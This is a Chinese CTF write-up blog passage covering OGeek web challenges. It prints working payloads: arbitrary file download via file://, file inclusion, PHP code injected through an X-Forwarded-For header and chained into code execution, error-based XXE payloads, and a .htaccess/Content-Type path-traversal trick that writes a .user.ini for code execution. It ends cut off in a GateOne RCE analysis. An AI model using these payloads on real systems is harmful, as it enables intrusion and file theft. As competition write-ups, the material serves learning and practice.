<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($for==<span class="string">'category'</span>) &#123;</span><br><span class="line">	$numberOfItems = $site-&gt;itemsPerPage();</span><br><span class="line">	<span class="comment">// Check media</span></span><br><span class="line">	$music = $_GET[<span class="string">'path'</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($music))&#123;</span><br><span class="line">		<span class="keyword">if</span>(!Sanitize::pathFile($music))&#123;</span><br><span class="line">			$filename = basename($music);</span><br><span class="line">			TCP::download($music,PATH_UPLOADS_PROFILES.md5($filename).<span class="string">"."</span>.<span class="string">"avi"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			Log::set(<span class="keyword">__METHOD__</span>.LOG_SEP.<span class="string">'Media request in  '</span>.date(<span class="string">'Y-m-d'</span>), LOG_TYPE_INFO);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$list = $categories-&gt;getList($categoryKey, $pageNumber, $numberOfItems);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是说进入了category就可以调用了TCP类中的download方法，从而可知，我们可以下载文件到本地，并会重命名为文件名的MD5值为新文件名，并且为avi格式文件，所以我们可以利用file协议来下载本地文件，即payload为</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">category<span class="regexp">/music?path=file:/</span><span class="regexp">//</span>flag</span><br></pre></td></tr></table></figure>
<p>(这个点一开始我们没审出来，因为上了个文件监控，发现突然生成了一个flag文件，然后直接脚本跑全场直接读Archer大佬们生成的flag文件，就这样开始起飞了，23333)</p>
<p><img src="/2019/09/26/OGeek%E5%86%B3%E8%B5%9B%E4%B8%A4%E9%81%93Web%E6%80%BB%E7%BB%93%E5%88%86%E6%9E%90/8418106-189fecff73e05c88.png" alt></p>
<h4 id="2-任意文件包含"><a href="#2-任意文件包含" class="headerlink" title="2.任意文件包含"></a>2.任意文件包含</h4><p>同样在对比分析的日志里</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">7.</span> bl-kernel/boot/rules/<span class="number">60.</span>router.php</span><br><span class="line">此处的<span class="keyword">include</span>获取可以配合errorlog来getshell</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($url-&gt;whereAmI()==<span class="string">'page'</span> &amp;&amp; !$url-&gt;notFound()) &#123;</span><br><span class="line">	$pageKey = $url-&gt;slug();</span><br><span class="line">	<span class="keyword">if</span> (Text::endsWith($pageKey, <span class="string">'/'</span>)) &#123;</span><br><span class="line">		$pageKey = rtrim($pageKey, <span class="string">'/'</span>);</span><br><span class="line">		Redirect::url(DOMAIN_PAGES.$pageKey);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">	$pageKey = explode(<span class="string">"/"</span>, $pageKey);</span><br><span class="line">	<span class="keyword">foreach</span>($pageKey <span class="keyword">as</span> $key)&#123;</span><br><span class="line">		<span class="keyword">if</span>(constant($key))</span><br><span class="line">			$plugin .=constant($key);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			$plugin .=<span class="string">"/"</span>.$key;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	$plugin = str_replace(<span class="string">".."</span>,<span class="string">"/"</span>,$plugin);</span><br><span class="line">	<span class="keyword">if</span>(file_exists($plugin))&#123;</span><br><span class="line">		$plugin = addslashes($plugin);</span><br><span class="line">		<span class="keyword">include</span> $plugin;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>errorlog的点没有触发成功，不过这个倒是可以配合任意文件下载来Getshell，只要下载一个木马文件，然后包含就成了，因为前一个洞打得早，所以基本都修了，简单分析一下这个点。<br>跟进分析的话可以看出首先将url的path赋值给了变量$pageKey ，判断是否正常以’/‘结尾，我们直接看非’/‘结尾的，将path用’/‘分割，用constant函数来判断是否是定义的常量，是便将常量值拼接，不是便重新恢复回path，最关键的是</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$plugin</span> = str_replace(<span class="string">".."</span>,<span class="string">"/"</span>,<span class="variable">$plugin</span>);</span><br><span class="line">if(file_exists(<span class="variable">$plugin</span>))&#123;</span><br><span class="line">	<span class="variable">$plugin</span> = addslashes(<span class="variable">$plugin</span>);</span><br><span class="line">	<span class="keyword">include</span> <span class="variable">$plugin</span>;</span><br></pre></td></tr></table></figure>
<p>进行..替换后，如果path表示的文件存在，addslashes()处理后直接进行文件包含，也就是说如果我url上带的是一个真实路径，就会直接文件包含了，这太真实了（在场上没精力分析- -..）所以payload</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>:xxx/flag</span><br></pre></td></tr></table></figure>
<p>也可以结合前面进行Getshell</p>
<h4 id="3-代码注入"><a href="#3-代码注入" class="headerlink" title="3.代码注入"></a>3.代码注入</h4><p>首先贴一张赛后收到的图片</p>
<p><img src="/2019/09/26/OGeek%E5%86%B3%E8%B5%9B%E4%B8%A4%E9%81%93Web%E6%80%BB%E7%BB%93%E5%88%86%E6%9E%90/8418106-917f02b2c3312404.jpg" alt></p>
<p>看到这个我都懵了，我下源码就扫了一遍，并没有内置的后门，所以肯定是有师傅调通了调用链，把代码给写进去了，tql（近期满课，木得时间看这些东西，吼了<a href="https://www.xmsec.cc" target="_blank" rel="noopener">陌小生</a>师傅分析了一波，这里就直接借鉴他的来写了），文件路径：bl-content/databases/security.php，由于文件路由，并不能直接访问这个文件，这个肯定是在调用过程中写入的，触发的话就阔以用的任意文件包含来触发RCE，我们先来找一波调用链，我比较喜欢用全局搜索来跟代码（所以我这么菜），全局找下blackList</p>
<p><img src="https://upload-images.jianshu.io/upload_images/8418106-1784179b58945b70.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>跟到security.class.php中有个addToBlacklist方法，简单明了，用来加黑名单的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">	<span class="comment">// Add or update the current client IP on the blacklist</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addToBlacklist</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$ip = <span class="keyword">$this</span>-&gt;getUserIp();</span><br><span class="line">		$currentTime = time();</span><br><span class="line">		$numberFailures = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;db[<span class="string">'blackList'</span>][$ip])) &#123;</span><br><span class="line">			$userBlack = <span class="keyword">$this</span>-&gt;db[<span class="string">'blackList'</span>][$ip];</span><br><span class="line">			$lastFailure = $userBlack[<span class="string">'lastFailure'</span>];</span><br><span class="line"></span><br><span class="line">			<span class="comment">// Check if the IP is expired, then renew the number of failures</span></span><br><span class="line">			<span class="keyword">if</span>($currentTime &lt;= $lastFailure + (<span class="keyword">$this</span>-&gt;db[<span class="string">'minutesBlocked'</span>]*<span class="number">60</span>)) &#123;</span><br><span class="line">				$numberFailures = $userBlack[<span class="string">'numberFailures'</span>];</span><br><span class="line">				$numberFailures = $numberFailures + <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">$this</span>-&gt;db[<span class="string">'blackList'</span>][$ip] = <span class="keyword">array</span>(<span class="string">'lastFailure'</span>=&gt;$currentTime, <span class="string">'numberFailures'</span>=&gt;$numberFailures);</span><br><span class="line">		Log::set(<span class="keyword">__METHOD__</span>.LOG_SEP.<span class="string">'Blacklist, IP:'</span>.$ip.<span class="string">', Number of failures:'</span>.$numberFailures);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUserIp</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>)) &#123;</span><br><span class="line">			$ip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</span><br><span class="line">		&#125; <span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_CLIENT_IP'</span>)) &#123;</span><br><span class="line">			$ip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$ip = getenv(<span class="string">'REMOTE_ADDR'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $ip;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>看下代码就很清楚了，把登录失败的用户的ip加到黑名单里，ip可以用XFF来构造，所以变量$ip是我们可控的了，也就是如果某个ip触发了黑名单规则，就会被记录下来，传入$this-&gt;db，调用save函数，跟进看下</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">#\bl-kernel\<span class="keyword">abstract</span>\dbjson<span class="class">.<span class="keyword">class</span>.<span class="title">php</span></span></span><br><span class="line">	<span class="keyword">public</span> function save()</span><br><span class="line">	&#123;</span><br><span class="line">		$<span class="keyword">data</span> = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;firstLine) &#123;</span><br><span class="line">			$<span class="keyword">data</span>  = <span class="string">"&lt;?php defined('Zero') or die('Zero CMS.'); ?&gt;"</span>.PHP_EOL;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Serialize database</span></span><br><span class="line">		$<span class="keyword">data</span> .= $<span class="keyword">this</span>-&gt;serialize($<span class="keyword">this</span>-&gt;db);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Backup the new database.</span></span><br><span class="line">		$<span class="keyword">this</span>-&gt;dbBackup = $<span class="keyword">this</span>-&gt;db;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// LOCK_EX flag to prevent anyone else writing to the file at the same time.</span></span><br><span class="line">		<span class="keyword">if</span> (file_put_contents($<span class="keyword">this</span>-&gt;file, $<span class="keyword">data</span>, LOCK_EX)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			Log::<span class="keyword">set</span>(__METHOD__.LOG_SEP.<span class="string">'Error occurred when trying to save the database file.'</span>, LOG_TYPE_ERROR);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>将this-&gt;db的数据拼接到了变量$data中，然后直接进行了file_put_contents操作，而在init.php中有申明了</p>
<figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">define</span></span>(<span class="string">'DB_SECURITY'</span>, PATH_DATABASES.<span class="symbol">'security.php'</span>);</span><br></pre></td></tr></table></figure>
<p>DB_SECURITY为传入构造函数的参数，也就是file，即写操作时将$data写入到了security.php中，所以也就有了开场图的东西。发个请求包</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.211.128</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 82</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.211.128/admin/</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: &lt;?php phpinfo(); ?&gt;    #</span><br><span class="line"><span class="attribute">Cookie</span>: Zero-KEY=uihdv2ju8k4pfd6kl79fqpg6j3</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">tokenCSRF=92355c8ea77e31cc1fe5c1d7882d13dad37e9866&amp;username=asd&amp;password=asd&amp;save=</span><br></pre></td></tr></table></figure>

<p><img src="/2019/09/26/OGeek%E5%86%B3%E8%B5%9B%E4%B8%A4%E9%81%93Web%E6%80%BB%E7%BB%93%E5%88%86%E6%9E%90/8418106-035db896b75d8426.png" alt></p>
<p>在结合一下的文件包含洞</p>
<p><img src="/2019/09/26/OGeek%E5%86%B3%E8%B5%9B%E4%B8%A4%E9%81%93Web%E6%80%BB%E7%BB%93%E5%88%86%E6%9E%90/8418106-4e813bfae6cad2cb.png" alt></p>
<h1 id="0x03-sec-login"><a href="#0x03-sec-login" class="headerlink" title="0x03 sec-login"></a>0x03 sec-login</h1><p>本菜不会java，这题听说是反序列化，就不写了</p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>AWD</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>Ogeek 线上Web Writeup</title>
    <url>/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/</url>
    <content><![CDATA[<p><strong>Ogeek和XNUCA有一天重了，第一天被卡在XNUCA，EZphp转这（<a href="https://www.jianshu.com/p/1875219503fd）上，心态有点受不了，所以Ogeek没什么战斗力" target="_blank" rel="noopener">https://www.jianshu.com/p/1875219503fd）上，心态有点受不了，所以Ogeek没什么战斗力</a>……</strong></p>
<h3 id="0x01-LookAround"><a href="#0x01-LookAround" class="headerlink" title="0x01 LookAround"></a>0x01 LookAround</h3><p>右键查看网页源码可以看到加载了一个/js/_.js，查看内容阔以看到向callback发送了个请求</p>
<p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-81074843651728ce.png" alt></p>
<p>请求方式是发送xml数据，所以判断为是一个XEE漏洞，不过利用参见的XXE payload打不通，只能够判断系统文件是否存在，</p>
<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:////flag"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%a;</span></span><br><span class="line"><span class="xml">]&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-574c6fce1ea6c651.png" alt></p>
<p>文件存在返回200状态，如果文件不存在则返回500状态，通过这点也可以确定存在XXE漏洞，只是如何触发的问题了，题目提示builded from tomcat:8-jre8<br>参考：<a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation" target="_blank" rel="noopener">https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation</a></p>
<p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-bd66835346322c7a.png" alt></p>
<p>不懂的话跟一下文章下面的视频就可以知道 tomcat:8-jre8 中的fonts.dtd可用，所以直接copy文章中对应的payload就好了</p>
<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span></span><br><span class="line"><span class="xml">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///usr/share/xml/fontconfig/fonts.dtd"</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">expr</span> <span class="meta-string">'aaa)&gt;</span></span></span></span><br><span class="line"><span class="xml">        <span class="meta">&lt;!ENTITY &amp;#x25; <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="meta">&lt;!ENTITY &amp;#x25; <span class="meta-keyword">eval</span> <span class="meta-string">"&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="symbol">&amp;#x25;</span>eval;</span></span><br><span class="line"><span class="xml">        <span class="symbol">&amp;#x25;</span>error;</span></span><br><span class="line"><span class="xml">        <span class="meta">&lt;!ELEMENT <span class="meta-keyword">aa</span> (<span class="meta-keyword">bb</span>'&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="perl">    %local_dtd;</span></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-73974d8169b53562.png" alt></p>
<h2 id="0x02-Easy-Realworld-Challenge"><a href="#0x02-Easy-Realworld-Challenge" class="headerlink" title="#0x02 Easy Realworld Challenge"></a>#0x02 Easy Realworld Challenge</h2><p>主办方放题失误吧，晚上放题，后来做了修改，白天又恢复了回去，所以变成了大家看到的两到题，因为题目上有一个log viewer，可以查看之前选手的操作记录（还是视频的），所以就是成了抄作业解题，跟着telnet://172.18.0.3 用户ctf，密码ctf,之后利用PSAV方式于服务器建立连接接收数据。</p>
<p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-28ead04fef913b8e.png" alt></p>
<p>然后新建一个终端到生成的端口号上接收数据就好了</p>
<p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-348adfa485e48aea.png" alt></p>
<p>唯一的可能会不知道的就是怎么知道被动连接的端口号，PSAV生成的例如：(172,18,0,3,131,116)，那么生成的端口号就是：131*256+116 = 33652(那个计算器算就好了)</p>
<h3 id="0x03-Enjoy-your-self"><a href="#0x03-Enjoy-your-self" class="headerlink" title="0x03 Enjoy your self"></a>0x03 Enjoy your self</h3><p>题目第一层源码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"../../utils/utils.php"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'filename'</span>])  <span class="keyword">and</span> preg_match(<span class="string">"/^\w&#123;8&#125;$/"</span>, $_REQUEST[<span class="string">'filename'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $filename = strtolower($_REQUEST[<span class="string">'filename'</span>]);</span></span><br><span class="line"><span class="php">    touch(<span class="string">"backup/&#123;$filename&#125;.txt"</span>);</span></span><br><span class="line"><span class="php">    unlink(glob(<span class="string">"backup/*"</span>)[<span class="number">0</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">preg_match</span><span class="params">(<span class="string">"/^\w&#123;8&#125;$/"</span>, $_REQUEST[<span class="string">'filename'</span>])</span></span></span><br></pre></td></tr></table></figure>
<p>正则匹配的是字母数字和下划线，固定长度为8，排序后会删除第一个文件，所以我们写入的文件排序在后面的话是不会被删除的，所以猜测，列表中存在存在某个不会被删除的文件，而这个目录又叫backup，所以猜测，可能会有隐藏的源码备份文件，而如果我们写入的文件排在固定文件之前，我们的文件会被删除。所以利用这个特性来fuzz固定文件的文件名，最后得到文件名为 aefebab8.txt，其中内容为</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- src/8a66c58a168c9dc0fb622365cbe340fc.php --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"../utils/utils.php"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$sandbox = Get_Sandbox();</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'method'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $method = $_REQUEST[<span class="string">'method'</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($method == <span class="string">'info'</span>)&#123;</span></span><br><span class="line"><span class="php">        phpinfo();</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">elseif</span>($method == <span class="string">'download'</span> <span class="keyword">and</span> <span class="keyword">isset</span>($_REQUEST[<span class="string">'url'</span>]))&#123;</span></span><br><span class="line"><span class="php">        $url = $_REQUEST[<span class="string">'url'</span>];</span></span><br><span class="line"><span class="php">        $url_parse = parse_url($url);</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($url_parse[<span class="string">'scheme'</span>]) <span class="keyword">or</span> $url_parse[<span class="string">'scheme'</span>] != <span class="string">'http'</span> <span class="keyword">or</span> !<span class="keyword">isset</span>($url_parse[<span class="string">'host'</span>]) <span class="keyword">or</span> $url_parse[<span class="string">'host'</span>] == <span class="string">""</span>)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">"something wrong"</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        $path_info = pathinfo($url);</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(strpos($path_info[<span class="string">'filename'</span>], <span class="string">"."</span>) !== <span class="keyword">false</span>)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">"something wrong"</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!Check_Ext($path_info[<span class="string">'extension'</span>]))&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">"something wrong"</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        $response = GetFileInfoFromHeader($url);</span></span><br><span class="line"></span><br><span class="line"><span class="php">        $save_dir = <span class="string">"../users/$&#123;sandbox&#125;/uploads/&#123;$response['type']&#125;/"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(is_dir(dirname($save_dir)) <span class="keyword">and</span> !is_dir($save_dir))&#123;</span></span><br><span class="line"><span class="php">            mkdir($save_dir, <span class="number">0755</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        $save_path = <span class="string">"&#123;$save_dir&#125;&#123;$path_info['filename']&#125;.&#123;$response['ext']&#125;"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"/uploads/&#123;$response['type']&#125;/&#123;$path_info['filename']&#125;.&#123;$response['ext']&#125;"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!is_dir($save_path))&#123;</span></span><br><span class="line"><span class="php">            file_put_contents($save_path, $response[<span class="string">'content'</span>]);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>

<p>给了源文件地址和源码，接下来就是代码审计的事，通过源文件查看phpinfo，可以得到网站根路径，以及知道有disable_function我就不多说了，代码提供一个远程文件下载功能，不过由于Check_Ext 函数限制了可下载的文件类型，只可以任意下载其他网站上的jpg、png 等图片格式的文件到本地，并以{$response[‘type’]}为目录名{$path_info[‘filename’]}.{$response[‘ext’]}为文件名，测试发现$response的值是从远程服务器response header中的Content-Type 获取，所以控制了个人服务器某个文件的Content-Type，构造</p>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">method</span>=<span class="title">download</span>&amp;<span class="title">url</span>=<span class="title">http</span>:</span><span class="comment">//x.x.x.x/.jpg</span></span><br></pre></td></tr></table></figure>
<p>去访问个人服务器上的一个图片文件就可以控制下载的内容，但是只下载图片肯定是解不了题，所以我们可以在vps上建一个.htaccess,设置404跳转</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ErrorDocument <span class="number">404</span> /cccc.php    #设置<span class="number">404</span> 跳转到到cccc.php 页面</span><br></pre></td></tr></table></figure>
<p>所以但访问某个不存在的jpg文件时就会跳转到cccc.php上，这样可以过掉Check_Ext的后缀检测。所以就是如何构造cccc.php的事了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cccc.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-Type: aaa/./1.jpg'</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"&lt;?php file_get_contents('/flag');?&gt;"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#我已经知道flag在这了就不多写scandir('/');这一步了</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-4cc317440cd80495.png" alt></p>
<p>这样会跨目录在uploads目录上创建1.jpg,文件的内容就是我们写入的代码</p>
<p><img src="https://upload-images.jianshu.io/upload_images/8418106-a3beece842f0d789.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>写入jpg文件格式的代码后，也就需要php文件包涵执行，题目限制死了，反正我是没写php文件成功过（听师傅们说前一晚放题时是可以的，我试过 /aaa/php/.没写成功就放弃了），.htaccess文件也写不了，不过还阔以写.user.ini文件，不过.user.ini文件只对当前目录和子目录中的php文件生效，所以我们写的时候还得跨到users目录去（sandbox可以试试，我是没写进去），这个地方有个坑，题目设置了定时清，还清得挺快的，刚开始一直以为不可写，后来突然发现有一次写进去了然后没了，才发现原来有定时清，所以利用bp 循环写下就好，次数不要太大，会被ban。<br>构造cccc.php</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">'Content-Type: .././.user.ini'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span>(<span class="string">"auto_prepend_file = /var/www/html/users/[sandbox]/uploads/1.jpg"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/8418106-8aa95fcc12ef8f4d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<h3 id="0x04-Easy-Realworld-Challenge-2"><a href="#0x04-Easy-Realworld-Challenge-2" class="headerlink" title="0x04 Easy Realworld Challenge 2"></a>0x04 Easy Realworld Challenge 2</h3><p>比赛期间没看这题（自我认识明确）按着glzjin师傅（<a href="https://www.zhaoj.in/）的思路进行的赛后复现，题目是一个开源的一个HTML5" target="_blank" rel="noopener">https://www.zhaoj.in/）的思路进行的赛后复现，题目是一个开源的一个HTML5</a> web-based terminal emulator and SSH client，地址：<a href="https://github.com/liftoff/GateOne，题目提示了flag" target="_blank" rel="noopener">https://github.com/liftoff/GateOne，题目提示了flag</a> is in localhost, show me your shell! ，也就是需要getshell了。解法不唯一，有好几个RCE点。漏洞代码路径：/gateone/applications/terminalplugins/ssh/ssh.py</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ssh.py</span></span><br><span class="line">def get_host_fingerprint(self, settings):</span><br><span class="line">    <span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">    Returns a the hash of the given host's public key by making a remote</span></span><br><span class="line"><span class="string">    connection to the server (not just by looking at known_hosts).</span></span><br><span class="line"><span class="string">    "</span><span class="string">""</span></span><br><span class="line">    out_dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'port'</span> <span class="keyword">not</span> <span class="keyword">in</span> settings:</span><br><span class="line">       <span class="built_in"> port </span>= 22</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">       <span class="built_in"> port </span>= settings[<span class="string">'port'</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'host'</span> <span class="keyword">not</span> <span class="keyword">in</span> settings:</span><br><span class="line">        out_dict[<span class="string">'result'</span>] = _(<span class="string">"Error:  You must supply a 